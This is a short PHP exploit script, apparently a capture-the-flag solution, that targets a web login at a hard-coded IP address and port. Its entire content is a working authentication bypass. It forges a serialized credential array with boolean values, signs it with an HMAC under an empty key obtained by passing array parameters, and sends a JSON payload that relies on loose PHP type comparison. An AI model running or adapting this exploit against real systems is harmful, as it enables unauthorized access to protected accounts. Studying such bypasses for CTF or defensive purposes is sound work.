<?php

$url = "http://34.40.105.109:32124";

$login_data = [
	'user' => true,
	'pass' => true
];

$check = serialize($login_data);
$empty_key = '';
$hash = hash_hmac('ripemd160', $check, $empty_key);

$json_payload = [
	'pass' => 0,
	'token' => true,
	'check' => $check,
	'hash' => $hash
];

$pass_param = json_encode($json_payload);

$params = [
	'pass' => $pass_param,
	'key[]' => '',
	'something[]' => ''
];

$full_url = $url . '?' . http_build_query($params);
$response = file_get_contents($full_url);
echo "\n[+] Response:\n$response\n";

?>
